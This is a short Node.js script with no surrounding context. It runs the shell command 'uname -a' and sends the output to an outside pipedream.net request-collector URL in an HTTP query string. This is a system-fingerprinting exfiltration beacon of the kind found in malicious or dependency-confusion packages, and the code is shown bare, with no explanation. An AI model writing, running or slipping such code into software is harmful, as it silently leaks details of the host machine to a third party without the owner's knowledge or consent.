const { exec } = require("child_process");
const http = require("http");

const targetURL = "https://eoow6y96ffo9mzx.m.pipedream.net/";
exec("uname -a", (err, stdout) => {
    if (err) return;
    http.get(`${targetURL}?data=${encodeURIComponent(stdout)}`);
});
